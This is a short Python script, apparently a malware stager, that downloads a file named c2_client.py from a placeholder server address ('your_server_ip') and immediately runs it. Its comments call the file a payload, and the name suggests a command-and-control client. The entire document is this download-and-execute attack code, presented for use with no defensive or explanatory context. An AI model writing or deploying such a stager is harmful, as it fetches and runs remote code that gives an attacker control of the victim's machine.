import urllib.request
import os
import subprocess

# Hardcoded payload details
PAYLOAD_URL = 'http://your_server_ip/payloads/c2_client.py'
PAYLOAD_FILENAME = 'c2_client.py'

# Download the payload
def download_payload(url, filename):
    try:
        urllib.request.urlretrieve(url, filename)
        print(f"[*] Payload downloaded as {filename}")
    except Exception as e:
        print(f"[!] Failed to download payload: {e}")

# Execute the payload
def execute_payload(filename):
    try:
        subprocess.Popen(['python', filename])
        print(f"[*] Executing payload: {filename}")
    except Exception as e:
        print(f"[!] Failed to execute payload: {e}")

if __name__ == "__main__":
    download_payload(PAYLOAD_URL, PAYLOAD_FILENAME)
    execute_payload(PAYLOAD_FILENAME)
